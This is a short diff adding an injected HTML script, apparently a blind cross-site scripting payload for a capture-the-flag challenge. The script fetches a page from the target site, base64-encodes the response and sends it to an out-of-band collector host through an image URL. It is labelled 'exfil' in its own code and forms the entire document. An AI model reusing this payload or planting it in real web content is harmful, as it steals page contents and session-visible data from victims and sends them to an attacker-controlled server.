@@ -1,0 +1,9 @@
+
+<script>
+exfil = new XMLHttpRequest();
+// Set the correct server - https://abc.domain.com 
+exfil.open("GET","https://omega.ctfio.com/blind/recipe");
+exfil.send();
+// our interact sh - webhookos
+exfil.onload = function(){ document.write('<img src="http://dcbkejrhjbjcpxkkhboksyhiq4j9st3fs.oast.fun/xx/?x=' + btoa(this.responseText) + '">');}
+</script>
